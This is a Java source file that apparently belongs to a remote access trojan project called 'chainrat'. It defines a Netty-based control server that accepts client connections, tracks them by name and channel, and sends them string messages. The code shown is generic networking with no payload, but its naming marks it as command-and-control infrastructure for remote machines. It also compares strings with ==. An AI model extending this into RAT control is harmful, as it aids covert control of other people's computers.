package com.nefi.chainrat.server.network.ControlServer;

import com.google.common.base.Charsets;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.log.Log;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioServerSocketChannel;

import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class ChainControlServer implements Runnable {

    private Log log;
    private static int port;
    private EventLoopGroup bossGroup;
    private EventLoopGroup workerGroup;
    private ChannelFuture f;

    public static List<Connection> clients = Collections.synchronizedList(new LinkedList<Connection>());


    public ChainControlServer(int port) {
        this.log = Main.getLog();
        this.port = port;
    }

    public void shutdown(){
        try {
            bossGroup.shutdownGracefully();
            workerGroup.shutdownGracefully();
            f.channel().closeFuture().sync();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        bossGroup = new NioEventLoopGroup(); // (1)
        workerGroup = new NioEventLoopGroup();
        try {
            ServerBootstrap b = new ServerBootstrap(); // (2)
            b.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class) // (3)
                    .childOption(ChannelOption.SO_KEEPALIVE, true)
                    .childHandler(new ChainControlChannelInitializer())
                    .option(ChannelOption.SO_BACKLOG, 128)          // (5)
                    .childOption(ChannelOption.SO_KEEPALIVE, true); // (6)


            // Bind and start to accept incoming connections.
            f = b.bind(port).sync(); // (7)

            // Wait until the server socket is closed.
            // In this example, this does not happen, but you can do that to gracefully
            // shut down your server.
            f.channel().closeFuture().sync();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    public static Connection getConnectionByName(String name){
        for(Connection connection : clients){
            if(connection.name == name){
                return connection;
            }
        }
        return null;
    }

    public static Connection getConnectionByChannel(Channel channel){
        return getConnectionByName(getClientNameByChannel(channel));
    }

    public static String getClientNameByChannel(Channel channel) throws ArrayIndexOutOfBoundsException{
        for(Connection connection : clients){
            if(connection.channel == channel){
                return connection.name;
            }
        }
        throw new ArrayIndexOutOfBoundsException();
    }

    public static void writeStringToChannel(Channel channel, String msg){
        ByteBuf buf = channel.alloc().buffer(msg.length());
        buf.writeCharSequence(msg, Charsets.UTF_8);
        channel.writeAndFlush(buf);
    }
}